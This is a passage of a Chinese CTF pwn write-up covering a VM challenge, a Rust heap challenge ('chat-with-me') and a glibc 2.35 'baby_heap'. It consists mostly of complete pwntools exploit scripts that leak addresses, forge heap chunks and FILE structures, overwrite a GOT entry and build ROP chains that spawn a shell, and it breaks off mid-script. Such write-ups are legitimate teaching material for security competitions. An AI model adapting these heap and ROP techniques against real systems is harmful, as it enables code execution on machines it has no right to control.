class="hljs-string">b&#x27;./flag\x00&#x27;</span><br>p.sendline(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_int</span>(<span class="hljs-params">x</span>):<br>   <span class="hljs-keyword">if</span> x &amp; <span class="hljs-number">0x80000000</span> != <span class="hljs-number">0</span>:<br>      x -= <span class="hljs-number">0x100000000</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(x).encode()<br><br>p.sendline(pack_int(environ_addr &amp; <span class="hljs-number">0xffffffff</span>))<br>p.sendline(pack_int(environ_addr &gt;&gt; <span class="hljs-number">32</span>))<br><br><span class="hljs-comment"># leak stack address</span><br>stack_addr_low = (<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop = <span class="hljs-literal">True</span>)) &amp; <span class="hljs-number">0xffffffff</span>)<br><br><span class="hljs-comment"># stage 3</span><br>code = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> <br>code += push_r(<span class="hljs-number">1</span>) <span class="hljs-comment">#leak stack_addr high</span><br>code += print_sp()<br><br><span class="hljs-comment">#set regs ptr</span><br>code += input_sp()<br>code += push(-<span class="hljs-number">0x10b4</span>//<span class="hljs-number">4</span>) + save()<br>code += input_sp()<br>code += push(-<span class="hljs-number">0x10b4</span>//<span class="hljs-number">4</span>+<span class="hljs-number">1</span>) + save()<br><br><span class="hljs-comment"># edit pop_r&#x27;s return address</span><br>code += push(rop_addr &amp; <span class="hljs-number">0xffffffff</span>)<br>code += pop_r(<span class="hljs-number">2</span>)<br>code += push(rop_addr &gt;&gt; <span class="hljs-number">32</span>)<br>code += pop_r(<span class="hljs-number">3</span>)<br>code += push(pop_rsp &amp; <span class="hljs-number">0xffffffff</span>)<br>code += pop_r(<span class="hljs-number">0</span>)<br>code += push(pop_rsp &gt;&gt; <span class="hljs-number">32</span>)<br>code += pop_r(<span class="hljs-number">1</span>)<br><br>code += jmp(<span class="hljs-number">1000</span>)<br><br>code = code.ljust(<span class="hljs-number">0xd4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.sendline(code)<br><br>stack_addr = stack_addr_low | ((<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop = <span class="hljs-literal">True</span>)) &amp; <span class="hljs-number">0xffffffff</span>) &lt;&lt; <span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stack_addr=&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_addr))<br><br>run_func_return_stack = stack_addr - <span class="hljs-number">0x4330</span><br><br><span class="hljs-comment"># f = open(&quot;./script.gdb&quot;)</span><br><span class="hljs-comment"># gdb.attach(p,gdbscript=f)</span><br><span class="hljs-comment"># f.close()</span><br><br>p.sendline(pack_int(run_func_return_stack &amp; <span class="hljs-number">0xffffffff</span>))<br>p.sendline(pack_int(run_func_return_stack &gt;&gt; <span class="hljs-number">32</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="chat-with-me"><a href="#chat-with-me" class="headerlink" title="chat-with-me"></a>chat-with-me</h1><p>rust pwn<br>逆向难度很大，基本上只能靠调试慢慢试</p><p>add()函数会得到一个栈上的指针<br>show()函数可以打印出80字节的数据，可以直接获取堆地址、栈地址<br>edit()函数可以编辑数据，并且有任意地址free</p><p>通过大量调用add()不断增大存放指针的堆块，直到达到unsorted bin的大小<br>然后用任意地址free掉这个堆块，再调用show()即可获取libc基地址</p><p>然后经过调试测试输入选择时会申请堆块，然后将数据拷贝进去<br>因此可以伪造堆块将堆分配到栈上进行ROP</p><p>利用edit函数在io缓冲区伪造0x30大小的堆块，然后释放掉它<br>测试输入选择时申请堆块拷贝数据后会释放掉它，因此需要在改写刚才伪造堆块的next指针时修改堆块的大小，从而让下次申请可以申请到修改后的指针</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    p.sendlineafter(<span class="hljs-string">b&quot;Choice &gt; &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Choice &gt; &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index &gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Choice &gt; &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index &gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;Content &gt; &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Choice &gt; &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index &gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&quot;Choice &gt; &quot;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unpackarr</span>():<br>    p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>    arr = <span class="hljs-built_in">eval</span>(p.recvuntil(<span class="hljs-string">b&#x27;]&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(arr)<br>    res = [<span class="hljs-number">0</span>]*<span class="hljs-number">10</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>        res[i] = u64(<span class="hljs-built_in">bytes</span>(arr[<span class="hljs-number">8</span>*i:<span class="hljs-number">8</span>*i+<span class="hljs-number">8</span>]))<br>    <span class="hljs-keyword">return</span> res<br><br>add()<br>show(<span class="hljs-number">0</span>)<br>arr = unpackarr()<br>heap_addr = arr[<span class="hljs-number">1</span>]<br>stack_addr = arr[<span class="hljs-number">4</span>]<br>bss_addr = arr[<span class="hljs-number">5</span>]<br>heap_base = heap_addr - <span class="hljs-number">0x2bb0</span><br>elf_base = bss_addr - <span class="hljs-number">0x0635b0</span><br>log.success(<span class="hljs-string">&quot;stack_addr -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(stack_addr))<br>log.success(<span class="hljs-string">&quot;heap_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br>log.success(<span class="hljs-string">&quot;elf_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(elf_base))<br><br>msg_addr = heap_base + <span class="hljs-number">0x2BD0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">150</span>):<br>    add()<br><br>edit(<span class="hljs-number">0</span>,cyclic(<span class="hljs-number">32</span>)+p64(msg_addr))<br><br>show(<span class="hljs-number">0</span>)<br>arr = unpackarr()<br>libc_addr = arr[<span class="hljs-number">4</span>]<br>libc_base = libc_addr - <span class="hljs-number">0x21acf0</span><br><br>add()<br><br>edit(<span class="hljs-number">150</span>,cyclic(<span class="hljs-number">32</span>)+p64(heap_base + <span class="hljs-number">0x000bd0</span>)+p64(<span class="hljs-number">0x31</span>))<br>edit(<span class="hljs-number">150</span>,cyclic(<span class="hljs-number">32</span>)+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(((heap_base+<span class="hljs-number">0x000bd0</span>) &gt;&gt; <span class="hljs-number">12</span>) ^ (stack_addr-<span class="hljs-number">88</span>)))<br><br>p.sendline(<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">32</span>+<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span> <span class="hljs-comment"># pop rdi ; ret</span><br>do_system = libc_base + <span class="hljs-number">0x050900</span> + <span class="hljs-number">2</span><br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>))<br><br>p.sendline(p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(binsh)+p64(do_system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h1><p>glibc2.35的堆题</p><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>赛时出题人失误没清空环境变量中的flag<br>所以可以将程序libc中的strncmp的got换成printf函数的地址<br>这样程序在调用putenv时便会打印出所有环境变量的值，从而获取flag</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;39.107.90.219&quot;,26684)</span><br><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.35.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;size \n&quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;delete: \n&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;edit: \n&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;content \n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;show: \n&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">env</span>(<span class="hljs-params">choice</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;sad !\n&quot;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret</span>(<span class="hljs-params">buf,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;addr \n&#x27;</span>)<br>    p.send(buf)<br>    sleep(<span class="hljs-number">1</span>)<br>    p.send(content)<br><br>add(<span class="hljs-number">0x520</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x520</span>) <span class="hljs-comment"># 2</span><br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;here \n&#x27;</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">8</span>))<br>libc_base = libc_addr - <span class="hljs-number">0x21ace0</span><br>log.success(<span class="hljs-string">&quot;libc_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>secret(p64(libc_base + libc.got[<span class="hljs-string">&#x27;strncmp&#x27;</span>]),p64(libc_base + libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>env(<span class="hljs-number">2</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>出题人还清空了io_wfile_jumps<br>应该是想要禁用apple，不过没禁好，任然可用io_wfile_jumps_maybe_mmap这条线</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># libc = ELF(&quot;./libc-2.35.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;size \n&quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;delete: \n&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;edit: \n&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;content \n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;show: \n&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret</span>(<span class="hljs-params">choice</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;sad !\n&quot;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">default</span>(<span class="hljs-params">buf,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;addr \n&#x27;</span>)<br>    p.send(buf)<br>    sleep(<span class="hljs-number">1</span>)<br>    p.send(content)<br><br>secret(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x520</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x500</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x510</span>) <span class="hljs-comment"># 3</span><br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x550</span>) <span class="hljs-comment"># 4</span><br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;The content is here \n&#x27;</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">8</span>))<br>p.recv(<span class="hljs-number">8</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br>libc_base = libc_addr-<span class="hljs-number">0x21b110</span><br>heap_base = heap_addr-<span class="hljs-number">0x001950</span><br><br>log.success(<span class="hljs-string">&quot;libc_base -&gt; &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-string">&quot;heap_base -&gt; &quot;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br>IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>fake_IO_file = heap_base + <span class="hljs-number">0x001950</span><br>IO_wfile_jumps_maybe_mmap = libc_base + <span class="hljs-number">0x216f40</span><br><br>f = flat(&#123;<br>    <span class="hljs-number">0x0</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _flags</span><br>    <span class="hljs-number">0x8</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_read_ptr</span><br>    <span class="hljs-number">0x10</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_read_end</span><br>    <span class="hljs-number">0x18</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_read_base</span><br>    <span class="hljs-number">0x20</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_write_base</span><br>    <span class="hljs-number">0x28</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_write_ptr</span><br>    <span class="hljs-number">0x30</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_write_end</span><br>    <span class="hljs-number">0x38</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_buf_base</span><br>    <span class="hljs-number">0x40</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_buf_end</span><br>    <span class="hljs-number">0x48</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_save_base</span><br>    <span class="hljs-number">0x50</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_backup_base</span><br>    <span class="hljs-number">0x58</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_save_end</span><br>    <span class="hljs-number">0x60</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># markers</span><br>    <span class="hljs-number">0x68</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _chain</span><br>    <span class="hljs-number">0x70</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _fileno</span><br>    <span class="hljs-number">0x74</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _flags2</span><br>    <span class="hljs-number">0x78</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _old_offset</span><br>    <span class="hljs-number">0x80</span>: p16(<span class="hljs-number">0</span>), <span class="hljs-comment"># _cur_column</span><br>    <span class="hljs-number">0x82</span>: p8(<span class="hljs-number">0</span>), <span class="hljs-comment"># _vtable_offset</span><br>    <span class="hljs-number">0x83</span>: p8(<span class="hljs-number">0</span>), <span class="hljs-comment"># _shortbuf</span><br>    <span class="hljs-number">0x88</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _lock</span><br>    <span class="hljs-number">0x90</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _offset</span><br>    <span class="hljs-number">0x98</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _codecvt</span><br>    <span class="hljs-number">0xa0</span>: p64(fake_IO_file + <span class="hljs-number">0xe0</span>), <span class="hljs-comment"># _wide_data</span><br>    <span class="hljs-number">0xa8</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _freeres_list</span><br>    <span class="hljs-number">0xb0</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _freeres_buf</span><br>    <span class="hljs-number">0xb8</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># __pad5</span><br>    <span class="hljs-number">0xc0</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _mode</span><br>    <span class="hljs-number">0xc4</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _unused2</span><br>    <span class="hljs-number">0xd8</span>: p64(IO_wfile_jumps_maybe_mmap), <span class="hljs-comment">#_vtables</span><br>    &#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>iofile = f.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>iofile += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span><br>iofile += p64(fake_IO_file + <span class="hljs-number">0x200</span>)<br>iofile = iofile.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>iofile += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0x68</span><br>iofile += p64(libc_base + <span class="hljs-number">0x00000000001136df</span>) <span class="hljs-comment"># mov rdx, qword ptr [rax + 0xb0] ; call qword ptr [rax + 0x88]</span><br>iofile += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>iofile += p64(libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">61</span>)<br>iofile += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>iofile += p64(fake_IO_file+<span class="hljs-number">0x2c0</span>)<br>iofile = iofile.ljust(<span class="hljs-number">0x2c0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>ret = libc_base + <span class="hljs-number">0x0000000000029139</span> <span class="hljs-comment"># ret</span><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002be51</span> <span class="hljs-comment"># pop rsi ; ret</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x000000000011f2e7</span> <span class="hljs-comment"># pop rdx ; pop r12 ; ret</span><br><br>setcontext = flat(&#123;<br>    <span class="hljs-number">0xa0</span>: p64(fake_IO_file+<span class="hljs-number">0x368</span>), <span class="hljs-comment"># 